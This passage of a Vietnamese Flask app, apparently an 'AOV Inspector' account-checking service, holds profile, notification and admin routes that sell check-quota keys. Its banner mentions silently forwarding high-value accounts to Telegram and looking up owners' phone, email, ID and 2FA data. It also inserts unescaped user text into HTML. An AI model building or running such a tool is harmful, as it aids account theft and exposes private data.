        is_current = (idx == cur_lvl); unlocked = (cur_exp >= lv["exp"])
        req_text = f"Cần {lv['exp']} EXP" if not unlocked else "✓ Đã mở"
        req_cls = "" if unlocked else "locked"
        items += f'''<div class="cg-item {'current' if is_current else ''}" style="color:{lv["color"]};">
            <div class="cg-icon">{lv["icon"]}</div>
            <div class="cg-info">
                <div class="cg-name" style="color:{lv["color"]};">{idx + 1}. {lv["name"]} {'← BẠN' if is_current else ''}</div>
                <div class="cg-stats">❤ {lv["hp"]} | ⚔ {lv["atk"]} | 🛡 {lv["def"]}</div>
                <div class="cg-req {req_cls}">{req_text}</div>
            </div></div>'''
    content = f'''<div class="card"><h2 class="card-title">📜 39 Cảnh Giới Tu Tiên</h2>
        <p style="color:var(--text-dim); font-size:0.9em; margin-bottom:14px;">Cảnh giới hiện tại: <b style="color:{CULTIVATION_LEVELS[min(cur_lvl, len(CULTIVATION_LEVELS)-1)]["color"]};">{CULTIVATION_LEVELS[min(cur_lvl, len(CULTIVATION_LEVELS)-1)]["name"]}</b></p>
        <div class="cg-list">{items}</div></div>
        <a href="/tu_tien" class="btn btn-secondary btn-block">← Quay Lại</a>'''
    return render_page(content, active_tab="tu_tien", user=user)

@app.route("/profile")
@login_required
def profile():
    user = get_user()
    cul = user.get("cultivation", {})
    lvl_name = CULTIVATION_LEVELS[cul.get("level", 0)]["name"] if cul.get("level", 0) < len(CULTIVATION_LEVELS) else "MAX"
    last_ci = user.get("last_checkin", 0); now = time.time()
    can_checkin = now - last_ci >= 86400
    ci_status = "Có thể điểm danh" if can_checkin else f"Còn {int(86400 - (now - last_ci)) // 3600}h"
    hist = user.get("history", [])
    counts = {"sss": sum(1 for h in hist if h.get("result") == "sss"),
              "ss": sum(1 for h in hist if h.get("result") == "ss"),
              "anime": sum(1 for h in hist if h.get("result") == "anime"),
              "trang": sum(1 for h in hist if h.get("result") in ("trang", "normal"))}
    content = f'''
    <div class="card"><h2 class="card-title">◐ Thông Tin</h2>
        <div class="info-row"><span class="info-label">Username</span><span class="info-value">{user['username']} {'👑' if user.get('is_admin') else ''}</span></div>
        <div class="info-row"><span class="info-label">ID</span><span class="info-value" style="font-family:monospace;">{user['id']}</span></div>
        <div class="info-row"><span class="info-label">Số dư</span><span class="info-value">{user.get('balance', 0)}</span></div>
        <div class="info-row"><span class="info-label">Đã mời</span><span class="info-value">{user.get('referrals', 0)}</span></div>
        <div class="info-row"><span class="info-label">Cảnh giới</span><span class="info-value">{lvl_name}</span></div></div>
    <div class="card"><h2 class="card-title">★ Kho Acc</h2>
        <div class="stat-grid-4">
            <a href="/history?tab=sss" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{counts['sss']}</div><div class="stat-label">◈ SSS</div></a>
            <a href="/history?tab=ss" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{counts['ss']}</div><div class="stat-label">◆ SS</div></a>
            <a href="/history?tab=anime" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{counts['anime']}</div><div class="stat-label">◇ Anime</div></a>
            <a href="/history?tab=trang" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{counts['trang']}</div><div class="stat-label">○ Trắng</div></a>
        </div>
        <a href="/export_vip_all" class="btn btn-success btn-block" style="margin-top:14px;">📥 XUẤT VIP ALL</a></div>
    <div class="card"><h2 class="card-title">◉ Điểm Danh</h2>
        <div class="info-row"><span class="info-label">Trạng thái</span><span class="info-value">{ci_status}</span></div>
        <div class="info-row"><span class="info-label">Phần thưởng</span><span class="info-value">+{DAILY_REWARD} xu</span></div>
        <form method="POST" action="/daily" style="margin-top:14px;">
            <button type="submit" class="btn btn-success btn-block" {'disabled' if not can_checkin else ''}>{'✓ Điểm Danh' if can_checkin else '◷ Đã Điểm Danh'}</button></form></div>
    <div class="card"><h2 class="card-title">🗑 Xoá Lịch Sử</h2>
        <p style="color:var(--text-dim); font-size:0.85em; margin-bottom:12px;">Xoá toàn bộ lịch sử check. Không thể hoàn tác!</p>
        <form method="POST" action="/clear_history" onsubmit="return confirm('Xoá TOÀN BỘ lịch sử?');">
            <button type="submit" class="btn btn-danger btn-block">🗑 XOÁ TOÀN BỘ</button></form></div>'''
    return render_page(content, active_tab="profile", user=user)

@app.route("/clear_history", methods=["POST"])
@login_required
def clear_history():
    user = get_user()
    user["history"] = []
    save_data(); flash("Đã xoá lịch sử!", "success")
    return redirect(url_for("profile"))

@app.route("/daily", methods=["POST"])
@login_required
def daily():
    user = get_user()
    now = time.time()
    if now - user.get("last_checkin", 0) < 86400: flash("Đã điểm danh hôm nay!", "error")
    else:
        user["balance"] += DAILY_REWARD; user["last_checkin"] = now
        save_data(); flash(f"+{DAILY_REWARD} xu!", "success")
    return redirect(url_for("profile"))

@app.route("/notifications")
@login_required
def notifications():
    user = get_user()
    mark_read()
    items = ""
    for n in reversed(NOTIFICATIONS):
        items += f'<div class="card"><div style="font-weight:700;">{n["title"]}</div><div style="font-size:0.72em; color:var(--text-mute);">{n["time"]} · {n["admin"]}</div><div style="white-space:pre-wrap; margin-top:8px;">{n["content"]}</div></div>'
    if not items: items = '<div class="card"><p style="text-align:center;">Chưa có thông báo</p></div>'
    return render_page(f'<div class="card"><h2 class="card-title">◉ Thông Báo</h2></div>{items}', active_tab="notif", user=user)

@app.route("/admin")
@admin_required
def admin_panel():
    user = get_user()
    tab = request.args.get("tab", "stats")
    body = ""
    if tab == "users":
        rows = ""
        for un, u in USERS.items():
            rows += f'''<div class="list-item"><div>{un} {"👑" if u.get("is_admin") else ""}</div>
                <form method="POST" action="/admin/add_balance" style="display:flex; gap:4px;">
                <input type="hidden" name="username" value="{un}">
                <input type="number" name="amount" placeholder="+/-" class="form-input" style="width:80px; padding:4px;">
                <button type="submit" class="btn btn-sm">+</button></form></div>'''
        body = f'<div class="card"><h3 class="card-title">◐ Users ({len(USERS)})</h3>{rows}</div>'
    elif tab == "keys":
        rows = ""
        for k, v in GENERATED_KEYS.items():
            rows += f'''<div class="list-item"><div><div style="font-family:monospace; color:#00f0ff;">{k}</div>
                <div style="font-size:0.72em;">còn {v["remaining_uses"]} · +{v["check_count"]}</div></div>
                <form method="POST" action="/admin/delete_key" style="margin:0;">
                <input type="hidden" name="key" value="{k}"><button type="submit" class="btn btn-sm btn-danger">✕</button></form></div>'''
        body = f'''<div class="card"><h3 class="card-title">◆ Tạo Key</h3>
            <form method="POST" action="/admin/create_key">
            <div class="form-group"><label class="form-label">Tên key</label><input type="text" name="name" class="form-input" required></div>
            <div class="form-group"><label class="form-label">Lượt check</label><input type="number" name="check_count" class="form-input" required min="1"></div>
            <div class="form-group"><label class="form-label">Số lần nhập</label><input type="number" name="uses" class="form-input" required min="1"></div>
            <button type="submit" class="btn btn-block">Tạo Key</button></form></div>
            <div class="card"><h3 class="card-title">◈ Keys ({len(GENERATED_KEYS)})</h3>{rows or "Chưa có"}</div>'''
    elif tab == "notif":
        body = '''<div class="card"><h3 class="card-title">◉ Gửi Thông Báo</h3>
            <form method="POST" action="/admin/send_notification">
            <div class="form-group"><label class="form-label">Tiêu đề</label><input type="text" name="title" class="form-input" required></div>
            <div class="form-group"><label class="form-label">Nội dung</label><textarea name="content" class="form-textarea" required></textarea></div>
            <button type="submit" class="btn btn-warning btn-block">Gửi</button></form></div>'''
    else:
        body = f'''<div class="card"><h2 class="card-title">◈ Thống Kê</h2>
            <div class="stat-grid"><div class="stat-box"><div class="stat-value">{len(USERS)}</div><div class="stat-label">Users</div></div>
            <div class="stat-box"><div class="stat-value">{len(GENERATED_KEYS)}</div><div class="stat-label">Keys</div></div>
            <div class="stat-box"><div class="stat-value">{_active_jobs_count[0]}</div><div class="stat-label">Job chạy</div></div>
            <div class="stat-box"><div class="stat-value">{len(JOB_QUEUE)}</div><div class="stat-label">Hàng chờ</div></div></div></div>
            <div class="card"><h3 class="card-title">⚡ Cộng Lượt Tất Cả</h3>
            <form method="POST" action="/admin/add_all"><div class="form-group">
            <input type="number" name="amount" class="form-input" required></div>
            <button type="submit" class="btn btn-warning btn-block">Cộng</button></form></div>'''
    content = f'''<div class="tab-bar">
        <a href="/admin" class="tab-item {'active' if tab == 'stats' else ''}">◈ Stats</a>
        <a href="/admin?tab=users" class="tab-item {'active' if tab == 'users' else ''}">◐ Users</a>
        <a href="/admin?tab=keys" class="tab-item {'active' if tab == 'keys' else ''}">◆ Keys</a>
        <a href="/admin?tab=notif" class="tab-item {'active' if tab == 'notif' else ''}">◉ T.Báo</a></div>{body}'''
    return render_page(content, active_tab="", user=user)

@app.route("/admin/create_key", methods=["POST"])
@admin_required
def admin_create_key():
    name = request.form.get("name", "").strip().upper()
    try: cc = int(request.form.get("check_count", 0)); us = int(request.form.get("uses", 0))
    except: flash("Số không hợp lệ!", "error"); return redirect(url_for("admin_panel", tab="keys"))
    if not name or cc <= 0 or us <= 0:
        flash("Dữ liệu không hợp lệ!", "error"); return redirect(url_for("admin_panel", tab="keys"))
    key = name
    if key in GENERATED_KEYS: key = f"{name}_{int(time.time())}"
    GENERATED_KEYS[key] = {"name": name, "remaining_uses": us, "check_count": cc,
                            "created_by": session["username"], "type": "forever", "created_at": time.time()}
    save_data(); flash(f"Đã tạo: {key}", "success")
    return redirect(url_for("admin_panel", tab="keys"))

@app.route("/admin/delete_key", methods=["POST"])
@admin_required
def admin_delete_key():
    k = request.form.get("key", "")
    if k in GENERATED_KEYS: del GENERATED_KEYS[k]; save_data(); flash("Đã xóa", "success")
    return redirect(url_for("admin_panel", tab="keys"))

@app.route("/admin/add_balance", methods=["POST"])
@admin_required
def admin_add_balance():
    un = request.form.get("username", "")
    try: amt = int(request.form.get("amount", 0))
    except: flash("Số không hợp lệ!", "error"); return redirect(url_for("admin_panel", tab="users"))
    if un in USERS: USERS[un]["balance"] = USERS[un].get("balance", 0) + amt; save_data(); flash(f"+{amt} cho {un}", "success")
    return redirect(url_for("admin_panel", tab="users"))

@app.route("/admin/add_all", methods=["POST"])
@admin_required
def admin_add_all():
    try: amt = int(request.form.get("amount", 0))
    except: flash("Số không hợp lệ!", "error"); return redirect(url_for("admin_panel"))
    for u in USERS.values(): u["balance"] = u.get("balance", 0) + amt
    save_data(); flash(f"+{amt} cho {len(USERS)} users", "success")
    return redirect(url_for("admin_panel"))

@app.route("/admin/send_notification", methods=["POST"])
@admin_required
def admin_send_notification():
    t = request.form.get("title", "").strip(); c = request.form.get("content", "").strip()
    if not t or not c: flash("Nhập đầy đủ!", "error"); return redirect(url_for("admin_panel", tab="notif"))
    notif = {"id": uuid.uuid4().hex[:10], "title": t, "content": c,
             "admin": session["username"],
             "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
             "timestamp": time.time()}
    NOTIFICATIONS.append(notif)
    if len(NOTIFICATIONS) > 200: NOTIFICATIONS.pop(0)
    save_data(); flash(f"Đã gửi: {t}", "success")
    return redirect(url_for("admin_panel", tab="notif"))

if __name__ == "__main__":
    load_data()
    create_admin()
    threading.Thread(target=auto_backup_worker, daemon=True).start()
    print("=" * 60)
    print("◈ AOV INSPECTOR - FULL CODE (đã tích hợp clm.py)")
    print("=" * 60)
    print(f"👑 Admin: {ADMIN_USERNAME} / {ADMIN_PASSWORD}")
    print(f"📱 Silent Telegram: >{SILENT_MIN_SKINS} skin hoặc >={SILENT_MIN_SSS} SSS")
    print(f"💾 Backup: mỗi {AUTO_BACKUP_INTERVAL}s → {BACKUP_DIR}/")
    print(f"🔄 Queue: tối đa {MAX_PARALLEL_JOBS} job song song")
    print(f"🔍 SĐT, Email, CMND, 2FA, Player UID, BAN, Skin CDN")
    print("=" * 60)
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
